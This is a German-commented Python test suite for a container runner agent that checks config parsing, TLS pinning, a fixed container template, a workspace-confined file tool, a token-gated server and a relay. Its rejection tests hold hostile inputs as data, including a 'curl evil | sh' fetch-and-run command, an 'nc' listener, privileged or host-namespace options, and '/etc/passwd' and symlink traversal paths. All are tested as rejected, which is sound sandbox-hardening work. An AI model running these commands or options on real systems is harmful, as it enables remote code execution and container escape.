"""Runner-Agent (M14-08/09): Einstellungen, Backoff, TLS, feste Vorlage, Hilfsprogramme.

Ohne Datenbank und ohne Container: ``mgpt-fs``, ``mgpt-serve`` und ``mgpt-relay``
laufen hier als lokale Prozesse bzw. im Thread mit eigenem Arbeitsverzeichnis.
"""

from __future__ import annotations

import asyncio
import copy
import json
import os
import socket
import subprocess
import sys
import threading
import urllib.error
import urllib.request
from pathlib import Path

import pytest

from runner_agent import config as agent_config
from runner_agent import mgpt_relay, mgpt_serve, protocol, template, tls
from runner_agent.backoff import Backoff

AGENT_DIR = Path(__file__).resolve().parent.parent / "runner_agent"
IMAGE = "ghcr.io/beerlesklopfer/multigpt-runner-work:1@sha256:" + "a" * 64
OTHER_IMAGE = "docker.io/library/alpine@sha256:" + "b" * 64


def _trust_files() -> dict:
    """Schlüsseldatei des Servers und signierter Katalog des Testlaufs (conftest)."""
    try:
        from django.conf import settings

        base = Path(settings.RUNNER_SERVER_KEY).parent
    except Exception:  # ohne Django (Vektor-Erzeugung als Skript)
        return {}
    if not (base / "server.pub").exists():
        return {}
    return {
        "server_key_file": str(base / "server.pub"),
        "catalog_file": str(base / "catalog.json"),
        "catalog_sig_file": str(base / "catalog.json.sig"),
        "catalog_key": (base / "catalog.key_id").read_text().strip(),
    }


def make_config(**kwargs) -> agent_config.Config:
    base = {"url": "wss://mgpt.example/runner/ws", "images": frozenset({IMAGE})}
    base.update(_trust_files())
    base.update(kwargs)
    return agent_config.Config(**base)


# --- Einstellungen -------------------------------------------------------------------


def test_url_is_normalized_and_plain_ws_needs_dev_flag():
    assert agent_config.normalize_url("https://mgpt.example") == "wss://mgpt.example/runner/ws"
    assert agent_config.normalize_url("wss://h:8443/runner/ws/") == "wss://h:8443/runner/ws"
    with pytest.raises(agent_config.ConfigError):
        agent_config.normalize_url("http://127.0.0.1:8001")
    assert (
        agent_config.normalize_url("http://127.0.0.1:8001", insecure_dev=True)
        == "ws://127.0.0.1:8001/runner/ws"
    )
    with pytest.raises(agent_config.ConfigError):
        agent_config.normalize_url("ftp://x")


def test_fingerprint_formats():
    raw = "AB:" * 31 + "AB"
    assert agent_config.normalize_fingerprint(raw) == "ab" * 32
    assert agent_config.normalize_fingerprint("sha256=" + "0" * 64) == "0" * 64
    assert agent_config.normalize_fingerprint("") is None
    with pytest.raises(agent_config.ConfigError):
        agent_config.normalize_fingerprint("abc")


def test_from_env_requires_digest_images_and_reads_token_only_from_file(tmp_path):
    token_file = tmp_path / "token"
    token_file.write_text("mgrt_" + "x" * 40 + "\n")
    env = {
        "MGPT_URL": "https://mgpt.example",
        "MGPT_TOKEN_FILE": str(token_file),
        "MGPT_IMAGES": IMAGE,
        "MGPT_TOKEN": "darf-nicht-zaehlen",
    }
    cfg = agent_config.from_env(env)
    assert cfg.images == {IMAGE}
    assert cfg.read_token() == "mgrt_" + "x" * 40
    with pytest.raises(agent_config.ConfigError):
        agent_config.from_env({**env, "MGPT_IMAGES": "debian:latest"})
    token_file.write_text("kaputt token")
    with pytest.raises(agent_config.ConfigError):
        cfg.read_token()
    os.unlink(token_file)
    with pytest.raises(agent_config.ConfigError):
        cfg.read_token()


# --- Backoff -------------------------------------------------------------------------


def test_backoff_grows_caps_and_resets():
    backoff = Backoff(base=1, factor=2, maximum=10, jitter=0.2, rand=lambda: 0.5)
    assert [backoff.next() for _ in range(6)] == [1, 2, 4, 8, 10, 10]
    backoff.reset()
    assert backoff.next() == 1
    assert backoff.next(longest=True) == 10


def test_backoff_jitter_stays_in_range():
    low = Backoff(base=4, jitter=0.25, rand=lambda: 0.0)
    high = Backoff(base=4, jitter=0.25, rand=lambda: 0.999999)
    assert low.next() == 3.0
    assert 4.99 < high.next() <= 5.0


def test_reconnect_decision_by_close_code():
    for code in (4401, 4403, 4409, 4426):
        assert not protocol.should_reconnect(code)
    for code in (1006, 1011, 1012, 1013, 4429):
        assert protocol.should_reconnect(code)


# --- TLS -----------------------------------------------------------------------------


class _FakeSsl:
    def __init__(self, der: bytes):
        self.der = der

    def getpeercert(self, binary_form=False):
        return self.der


def test_pin_check():
    der = b"zertifikat"
    pin = tls.fingerprint(der)
    tls.check_pin(_FakeSsl(der), pin)
    tls.check_pin(None, None)
    with pytest.raises(tls.PinError):
        tls.check_pin(_FakeSsl(b"anderes"), pin)
    with pytest.raises(tls.PinError):
        tls.check_pin(None, pin)
    ctx = tls.client_context(pin)
    assert ctx.check_hostname is False
    assert tls.client_context(None).check_hostname is True


# --- Feste Vorlage ---------------------------------------------------------------------


def _limits(**kw):
    values = {"cpus": 1.5, "memory_mb": 512, "pids": 256, "tmpfs_mb": 128, "network": "none"}
    values.update(kw)
    return template.Limits(**values)


def _work(**kw):
    return template.work_body(
        "42",
        "7",
        IMAGE,
        _limits(**kw),
        template.network_name("42"),
        10080,
        {"limits": _limits(**kw).as_dict()},
    )


def test_work_body_matches_template():
    cfg = make_config()
    body = _work()
    assert template.check_body(body, cfg) == "work"
    assert body["cap_drop"] == ["ALL"]
    assert body["read_only_filesystem"] is True
    assert body["privileged"] is False
    assert body["user"] == "1000:1000"
    assert body["resource_limits"]["memory"] == {"limit": 512 << 20, "swap": 512 << 20}
    # Standardexport (Nutzer 2026-10-14): 8080 → 10080, 8443 → 10443, im Heimnetz.
    assert body["portmappings"] == [
        {"host_ip": "0.0.0.0", "host_port": 10080, "container_port": 8080, "protocol": "tcp"},
        {"host_ip": "0.0.0.0", "host_port": 10443, "container_port": 8443, "protocol": "tcp"},
    ]
    assert [m["destination"] for m in body["mounts"]] == ["/workspace", "/tmp"]
    assert "HOME" in body["env"] and body["env"]["HOME"].startswith("/tmp")
    assert template.check_body(template.relay_body("42", IMAGE, [("10.0.0.5", 22)]), cfg) == "relay"


def _mutations():
    def bind_mount(b):
        b["mounts"].append(
            {"destination": "/host", "type": "bind", "source": "/home", "options": ["rw"]}
        )

    def socket_mount(b):
        b["mounts"][0] = {
            "destination": "/workspace",
            "type": "bind",
            "source": "/run/podman.sock",
            "options": [],
        }

    def tmpfs_extra_dest(b):
        b["mounts"].append(
            {"destination": "/etc", "type": "tmpfs", "source": "tmpfs", "options": ["size=1m"]}
        )

    def tmpfs_suid(b):
        b["mounts"][0]["options"] = ["size=64m", "mode=0700"]

    def two_ports(b):
        b["portmappings"].append(dict(b["portmappings"][0], host_port=10081))

    yield "volumes", lambda b: b.update(volumes=[{"Name": "x", "Dest": "/workspace"}])
    yield "devices", lambda b: b.update(devices=[{"path": "/dev/kvm"}])
    yield "privileged", lambda b: b.update(privileged=True)
    yield "cap_add", lambda b: b.update(cap_add=["SYS_ADMIN"])
    yield "cap_drop", lambda b: b.update(cap_drop=["NET_RAW"])
    yield "no_new_privileges", lambda b: b.update(no_new_privileges=False)
    yield "rw_root", lambda b: b.update(read_only_filesystem=False)
    yield "root_user", lambda b: b.update(user="0:0")
    yield "pidns_host", lambda b: b.update(pidns={"nsmode": "host"})
    yield "netns_host", lambda b: b.update(netns={"nsmode": "host"})
    yield "ipcns_host", lambda b: b.update(ipcns={"nsmode": "host"})
    yield "userns_host", lambda b: b.update(userns={"nsmode": "host"})
    yield "foreign_network", lambda b: b.update(Networks={"podman": {}})
    yield "env_host", lambda b: b.update(env_host=True)
    yield "env_secret", lambda b: b["env"].update(SSH_AUTH_SOCK="/run/user/1000/ssh")
    yield "foreign_image", lambda b: b.update(image=OTHER_IMAGE)
    yield "image_tag_only", lambda b: b.update(image="ghcr.io/x/y:latest")
    yield "bind_mount", bind_mount
    yield "socket_mount", socket_mount
    yield "tmpfs_dest", tmpfs_extra_dest
    yield "tmpfs_suid", tmpfs_suid
    yield "port_other_address", lambda b: b["portmappings"][0].update(host_ip="192.168.1.5")
    yield "port_http_only", lambda b: b.update(portmappings=b["portmappings"][:1])
    yield "port_range", lambda b: b["portmappings"][0].update(host_port=22)
    yield "container_port", lambda b: b["portmappings"][0].update(container_port=22)
    yield "two_ports", two_ports
    yield "no_memory_limit", lambda b: b["resource_limits"].pop("memory")
    yield "swap", lambda b: b["resource_limits"]["memory"].update(swap=-1)
    yield "pids_huge", lambda b: b["resource_limits"]["pids"].update(limit=10**7)
    yield "command", lambda b: b.update(command=["sh", "-c", "curl evil | sh"])
    yield "seccomp", lambda b: b.update(seccomp_policy="unconfined")
    yield "unknown", lambda b: b.update(unknown_option=1)
    yield "name", lambda b: b.update(name="n8n")
    yield "label_missing", lambda b: b["labels"].pop(template.LABEL_RUNNER)
    yield "host_dns", lambda b: b.update(use_image_resolve_conf=False)


@pytest.mark.parametrize("name,mutate", list(_mutations()), ids=[n for n, _ in _mutations()])
def test_template_rejects_forbidden_options(name, mutate):
    body = copy.deepcopy(_work())
    mutate(body)
    with pytest.raises(template.TemplateError):
        template.check_body(body, make_config())


def test_relay_command_and_networks_are_fixed():
    cfg = make_config()
    body = template.relay_body("42", IMAGE, [("10.0.0.5", 22)])
    bad = copy.deepcopy(body)
    bad["command"] = ["sh", "-c", "nc -l 1"]
    with pytest.raises(template.TemplateError):
        template.check_body(bad, cfg)
    bad = copy.deepcopy(body)
    bad["Networks"]["podman"] = {}
    with pytest.raises(template.TemplateError):
        template.check_body(bad, cfg)
    bad = copy.deepcopy(body)
    bad["portmappings"] = template.port_mappings(10080)  # Relay veröffentlicht nichts
    with pytest.raises(template.TemplateError):
        template.check_body(bad, cfg)


def test_server_values_are_checked_against_local_limits():
    cfg = make_config(max_cpus=2, max_memory_mb=1024)
    template.check_limits(_limits(cpus=2, memory_mb=1024), cfg)
    with pytest.raises(template.TemplateError):
        template.check_limits(_limits(cpus=4), cfg)
    with pytest.raises(template.TemplateError):
        template.check_limits(_limits(memory_mb=4096), cfg)
    with pytest.raises(template.TemplateError):
        template.check_image(OTHER_IMAGE, [OTHER_IMAGE], cfg.images)
    with pytest.raises(template.TemplateError):
        template.check_image(IMAGE, [OTHER_IMAGE], cfg.images)
    template.check_image(IMAGE, [IMAGE], cfg.images)


def test_network_body_must_be_internal_without_dns():
    name = template.network_name("42")
    template.check_network_body(template.network_body(name, internal=True, labels={}))
    with pytest.raises(template.TemplateError):
        template.check_network_body(template.network_body(name, internal=False, labels={}))
    body = template.network_body(name, internal=True, labels={})
    body["dns_enabled"] = True
    with pytest.raises(template.TemplateError):
        template.check_network_body(body)
    with pytest.raises(template.TemplateError):
        template.check_network_body(template.network_body("podman", internal=True, labels={}))


def _inspect(**host):
    base = {
        "CpuQuota": 150000,
        "CpuPeriod": 100000,
        "Memory": 512 << 20,
        "MemorySwap": 512 << 20,
        "PidsLimit": 256,
        "Tmpfs": {
            "/workspace": "size=128m,mode=0700,nosuid,nodev,rw",
            "/tmp": "size=256m,mode=1777,nosuid,nodev,rw",
        },
        "ReadonlyRootfs": True,
        "Privileged": False,
        "CapAdd": [],
        "SecurityOpt": ["no-new-privileges"],
        "NetworkMode": "bridge",
        "PidMode": "private",
        "PortBindings": {
            "8080/tcp": [{"HostIp": "0.0.0.0", "HostPort": "10080"}],
            "8443/tcp": [{"HostIp": "0.0.0.0", "HostPort": "10443"}],
        },
        "Binds": [],
    }
    base.update(host)
    return {"HostConfig": base, "Config": {"User": "1000:1000"}, "Mounts": []}


def test_inspect_comparison_reports_deviations():
    expected = _limits()
    assert template.check_inspect(_inspect(), expected, 10080) == []
    assert template.actual_limits(_inspect(), "none") == expected
    assert template.check_inspect(_inspect(Memory=1 << 30, MemorySwap=1 << 30), expected, 10080)
    assert template.check_inspect(_inspect(Privileged=True), expected, 10080)
    assert template.check_inspect(_inspect(PidMode="host"), expected, 10080)
    assert template.check_inspect(_inspect(Binds=["/home:/x"]), expected, 10080)
    loopback = {
        "8080/tcp": [{"HostIp": "127.0.0.1", "HostPort": "10080"}],
        "8443/tcp": [{"HostIp": "127.0.0.1", "HostPort": "10443"}],
    }
    assert template.check_inspect(_inspect(PortBindings=loopback), expected, 10080)
    assert (
        template.check_inspect(_inspect(PortBindings=loopback), expected, 10080, None, "127.0.0.1")
        == []
    )
    only_http = {"8080/tcp": [{"HostIp": "0.0.0.0", "HostPort": "10080"}]}
    assert template.check_inspect(_inspect(PortBindings=only_http), expected, 10080)


# --- mgpt-fs -----------------------------------------------------------------------------


def run_fs(root: Path, request: dict, payload: bytes = b"") -> tuple[dict, bytes]:
    tmp = root.parent / (root.name + "-tmp")
    tmp.mkdir(exist_ok=True)
    env = {
        "PATH": os.environ["PATH"],
        "MGPT_WORKSPACE": str(root),
        "MGPT_TMP": str(tmp),
        "HOME": str(tmp),
        "GIT_CONFIG_NOSYSTEM": "1",
        "GIT_CONFIG_GLOBAL": os.devnull,
        "MGPT_SCRATCH": os.environ.get("MGPT_SCRATCH", str(root.parent / "kein-scratch")),
    }
    proc = subprocess.run(
        [sys.executable, str(AGENT_DIR / "mgpt_fs.py")],
        input=json.dumps(request).encode() + b"\n" + payload,
        capture_output=True,
        env=env,
        cwd=root,
        timeout=60,
    )
    line, _, rest = proc.stdout.partition(b"\n")
    return json.loads(line), rest


@pytest.fixture
def ws(tmp_path):
    root = tmp_path / "workspace"
    root.mkdir()
    return root


def test_fs_write_read_edit(ws):
    res, _ = run_fs(ws, {"op": "write", "path": "src/app.py", "content": "a = 1\nb = 2\n"})
    assert res == {"ok": True, "path": "src/app.py", "bytes": 12, "created": True}
    res, _ = run_fs(ws, {"op": "read", "path": "/workspace/src/app.py"})
    assert res["content"] == "     1\ta = 1\n     2\tb = 2"
    res, _ = run_fs(ws, {"op": "read", "path": "src/app.py", "offset": 2, "limit": 1})
    assert res["content"] == "     2\tb = 2" and res["lines"] == 2
    res, _ = run_fs(
        ws, {"op": "edit", "path": "src/app.py", "old_string": "b = 2", "new_string": "b = 3"}
    )
    assert res["ok"] and (ws / "src/app.py").read_text() == "a = 1\nb = 3\n"
    run_fs(ws, {"op": "write", "path": "dup.txt", "content": "x x"})
    res, _ = run_fs(ws, {"op": "edit", "path": "dup.txt", "old_string": "x", "new_string": "y"})
    assert not res["ok"] and "2-mal" in res["error"]
    res, _ = run_fs(
        ws,
        {
            "op": "edit",
            "path": "dup.txt",
            "old_string": "x",
            "new_string": "y",
            "replace_all": True,
        },
    )
    assert res["replacements"] == 2 and (ws / "dup.txt").read_text() == "y y"


@pytest.mark.parametrize(
    "path", ["/etc/passwd", "../outside.txt", "/workspace/../etc/x", "a/../../b", "/tmp/x"]
)
def test_fs_rejects_paths_outside_workspace(ws, path):
    res, _ = run_fs(ws, {"op": "write", "path": path, "content": "x"})
    assert res["ok"] is False and "/workspace" in res["error"]
    res, _ = run_fs(ws, {"op": "read", "path": path})
    assert res["ok"] is False


def test_fs_rejects_symlinks_leading_out(ws, tmp_path):
    secret = tmp_path / "secret.txt"
    secret.write_text("geheim")
    (ws / "link").symlink_to(secret)
    (ws / "dirlink").symlink_to(tmp_path)
    for request in (
        {"op": "read", "path": "link"},
        {"op": "write", "path": "link", "content": "x"},
        {"op": "write", "path": "dirlink/new.txt", "content": "x"},
        {"op": "edit", "path": "link", "old_string": "geheim", "new_string": "x"},
        {"op": "grep", "pattern": "geheim", "path": "dirlink"},
    ):
        res, _ = run_fs(ws, request)
        assert res["ok"] is False, request
        assert "Symlink" in res["error"]
    assert secret.read_text() == "geheim"
    res, _ = run_fs(ws, {"op": "grep", "pattern": "geheim"})
    assert res["matches"] == []
    # Symlink innerhalb bleibt erlaubt
    (ws / "a.txt").write_text("inhalt")
    (ws / "b.txt").symlink_to(ws / "a.txt")
    res, _ = run_fs(ws, {"op": "read", "path": "b.txt"})
    assert res["ok"] and "inhalt" in res["content"]


def test_fs_git_dir_is_write_protected(ws):
    run_fs(ws, {"op": "init"})
    res, _ = run_fs(ws, {"op": "write", "path": ".git/config", "content": "[core]\n"})
    assert res["ok"] is False and ".git" in res["error"]
    res, _ = run_fs(ws, {"op": "write", "path": "./.git/hooks/pre-commit", "content": "x"})
    assert res["ok"] is False


def test_fs_glob_grep_and_binary(ws):
    run_fs(ws, {"op": "write", "path": "a.py", "content": "print('Hallo')\n"})
    run_fs(ws, {"op": "write", "path": "pkg/b.py", "content": "x = 'hallo welt'\n"})
    run_fs(ws, {"op": "write", "path": "pkg/c.js", "content": "// hallo\n"})
    (ws / "bin.dat").write_bytes(b"\x00\x01hallo")
    res, _ = run_fs(ws, {"op": "glob", "pattern": "**/*.py"})
    assert sorted(res["paths"]) == ["a.py", "pkg/b.py"]
    res, _ = run_fs(ws, {"op": "glob", "pattern": "*.py"})
    assert res["paths"] == ["a.py"]
    res, _ = run_fs(ws, {"op": "grep", "pattern": "hallo", "ignore_case": True})
    assert sorted(res["matches"]) == [
        "a.py:1:print('Hallo')",
        "pkg/b.py:1:x = 'hallo welt'",
        "pkg/c.js:1:// hallo",
    ]
    res, _ = run_fs(ws, {"op": "grep", "pattern": "hallo", "glob": "*.js"})
    assert res["matches"] == ["pkg/c.js:1:// hallo"]
    res, _ = run_fs(ws, {"op": "grep", "pattern": "("})
    assert res["ok"] is False
    res, _ = run_fs(ws, {"op": "read", "path": "bin.dat"})
    assert res["ok"] is False and "Binär" in res["error"]


def test_fs_fetch_for_preview(ws, tmp_path):
    run_fs(ws, {"op": "write", "path": "site/index.html", "content": "<h1>Hi</h1>"})
    run_fs(ws, {"op": "write", "path": "site/js/app.js", "content": "1"})
    (ws / "site/out").symlink_to(tmp_path)
    res, _ = run_fs(ws, {"op": "fetch", "dir": "site", "path": "/"})
    assert res["status"] == 200 and res["content_type"].startswith("text/html")
    res, _ = run_fs(ws, {"op": "fetch", "dir": "site", "path": "/js/app.js?v=1"})
    assert res["status"] == 200 and res["content_type"].startswith("text/javascript")
    for path in ("/js/", "/../secret", "/out/x", "/nope.html"):
        res, _ = run_fs(ws, {"op": "fetch", "dir": "site", "path": path})
        assert res["status"] == 404, path


def test_fs_bundle_roundtrip(ws, tmp_path):
    res, _ = run_fs(ws, {"op": "init"})
    assert res == {"ok": True, "head": None}
    res, data = run_fs(ws, {"op": "bundle_out"})
    assert res["size"] == 0 and data == b""
    run_fs(ws, {"op": "write", "path": "main.py", "content": "print(1)\n"})
    res, _ = run_fs(ws, {"op": "commit", "message": "write main.py"})
    assert res["changed"] is True and len(res["head"]) == 40
    head = res["head"]
    res, _ = run_fs(ws, {"op": "commit", "message": "nichts"})
    assert res == {"ok": True, "changed": False, "head": head}
    res, data = run_fs(ws, {"op": "bundle_out"})
    assert res["head"] == head and res["size"] == len(data) > 0
    import hashlib

    assert hashlib.sha256(data).hexdigest() == res["sha256"]
    other = tmp_path / "ws2"
    other.mkdir()
    res, _ = run_fs(other, {"op": "bundle_in", "size": len(data)}, data)
    assert res == {"ok": True, "head": head}
    assert (other / "main.py").read_text() == "print(1)\n"
    res, _ = run_fs(other, {"op": "bundle_in", "size": 5}, b"kaput")
    assert res["ok"] is False


# --- mgpt-serve ---------------------------------------------------------------------------


def _free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def test_serve_requires_token_and_lists_nothing(ws, tmp_path, monkeypatch):
    (ws / "site").mkdir()
    (ws / "site/index.html").write_text("<p>ok</p>")
    (ws / "site/sub").mkdir()
    (ws / "site/sub/a.txt").write_text("a")
    (tmp_path / "geheim.txt").write_text("geheim")
    (ws / "site/leak.txt").symlink_to(tmp_path / "geheim.txt")
    monkeypatch.setattr(mgpt_serve, "WORKSPACE", str(ws))
    token = "T" * 24
    handler = type("H", (mgpt_serve.Handler,), {"root": str(ws / "site"), "prefix": f"/{token}/"})
    from http.server import ThreadingHTTPServer

    port = _free_port()
    server = ThreadingHTTPServer(("127.0.0.1", port), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    base = f"http://127.0.0.1:{port}"

    def get(path):
        try:
            with urllib.request.urlopen(base + path, timeout=5) as resp:
                return resp.status, resp.read(), resp.headers
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read(), exc.headers

    try:
        status, body, headers = get(f"/{token}/")
        assert status == 200 and body == b"<p>ok</p>"
        assert "sandbox" in headers["Content-Security-Policy"]
        assert headers["X-Content-Type-Options"] == "nosniff"
        assert get(f"/{token}/sub/a.txt")[0] == 200
        assert get("/index.html")[0] == 404
        assert get(f"/{'X' * 24}/index.html")[0] == 404
        assert get(f"/{token}/sub/")[0] == 404  # keine Verzeichnisliste
        assert get(f"/{token}/leak.txt")[0] == 404
        assert get(f"/{token}/../../geheim.txt")[0] == 404
    finally:
        server.shutdown()


# --- mgpt-relay ----------------------------------------------------------------------------


def test_relay_forwards_only_to_listed_target():
    async def scenario():
        async def echo(reader, writer):
            data = await reader.read(100)
            writer.write(b"echo:" + data)
            await writer.drain()
            writer.close()

        target = await asyncio.start_server(echo, "127.0.0.1", 0)
        target_port = target.sockets[0].getsockname()[1]
        base = _free_port()
        relay = asyncio.create_task(
            mgpt_relay.serve(base, [("127.0.0.1", target_port)], "127.0.0.1")
        )
        await asyncio.sleep(0.2)
        reader, writer = await asyncio.open_connection("127.0.0.1", base)
        writer.write(b"hallo")
        await writer.drain()
        answer = await asyncio.wait_for(reader.read(100), 5)
        writer.close()
        with pytest.raises(OSError):
            await asyncio.open_connection("127.0.0.1", base + 1)
        relay.cancel()
        target.close()
        return answer

    assert asyncio.run(scenario()) == b"echo:hallo"
    with pytest.raises(ValueError):
        mgpt_relay.parse_target("host")
    assert mgpt_relay.parse_target("[fe80::1]:22") == ("fe80::1", 22)


SCRATCH_UUID = "0b5f2c1e-7d4a-4c1b-9a8e-3f2d1c0b9a87"


def _local_body(cfg):
    scratch = template.Scratch("local", 1024, f"{cfg.scratch_host_dir}/{SCRATCH_UUID}")
    return template.work_body(
        "42", "7", IMAGE, _limits(), template.network_name("42"), None, {}, scratch
    )


@pytest.mark.parametrize(
    "mutate",
    [
        lambda b: b["mounts"][-1].update(source="/home/user"),
        lambda b: b["mounts"][-1].update(source="/home/user/MultiGPT/Scratch/../.ssh"),
        lambda b: b["mounts"][-1].update(options=["rbind", "rw"]),
        lambda b: b["mounts"][-1].update(destination="/workspace"),
        lambda b: b.pop("userns"),
        lambda b: b.update(userns={"nsmode": "host"}),
    ],
)
def test_local_scratch_bind_is_strictly_limited(mutate):
    cfg = make_config(scratch_host_dir="/home/user/MultiGPT/Scratch")
    body = _local_body(cfg)
    assert template.check_body(body, cfg) == "work"
    mutate(body)
    with pytest.raises(template.TemplateError):
        template.check_body(body, cfg)
    # Ohne eingerichteten Ordner gibt es gar keinen Bind-Mount
    with pytest.raises(template.TemplateError):
        template.check_body(_local_body(cfg), make_config())


def test_userns_only_with_local_scratch():
    body = _work()
    body["userns"] = dict(template.KEEP_ID)
    with pytest.raises(template.TemplateError):
        template.check_body(body, make_config())


def test_helper_container_only_on_relay_network():
    cfg = make_config()
    body = template.tool_body("42", "c1", IMAGE)
    assert template.check_body(body, cfg) == "tool"
    assert list(body["Networks"]) == [template.network_name("42", "rel")]
    for mutate in (
        lambda b: b["Networks"].update({template.network_name("42", "net"): {}}),
        lambda b: b["mounts"].append(template._tmpfs("/workspace", 16, "0700", True)),
        lambda b: b.update(command=["ssh", "x"]),
        lambda b: b.update(name=template.container_name("42", "tool", "other")),
    ):
        bad = copy.deepcopy(body)
        mutate(bad)
        with pytest.raises(template.TemplateError):
            template.check_body(bad, cfg)
    rel = template.network_body(template.network_name("42", "rel"), internal=False, labels={})
    with pytest.raises(template.TemplateError):
        template.check_network_body(rel)


def test_fs_scratch_limit_before_write(tmp_path, monkeypatch):
    ws = tmp_path / "workspace"
    ws.mkdir()
    scratch = tmp_path / "scratch"
    scratch.mkdir()
    monkeypatch.setenv("MGPT_SCRATCH", str(scratch))
    env_root = ws
    res, _ = run_fs(env_root, {"op": "write", "path": "/scratch/a", "content": "x" * 5000,
                               "scratch_limit": 4096})  # fmt: skip
    assert res["ok"] is False and "Scratchpad voll" in res["error"]
    res, _ = run_fs(env_root, {"op": "write", "path": "/scratch/a", "content": "x" * 100,
                               "scratch_limit": 1 << 20})  # fmt: skip
    assert res["ok"] is True and res["path"] == "/scratch/a"
    # /workspace zählt nicht zum Scratchpad
    res, _ = run_fs(env_root, {"op": "write", "path": "big", "content": "x" * 9000,
                               "scratch_limit": 4096})  # fmt: skip
    assert res["ok"] is True
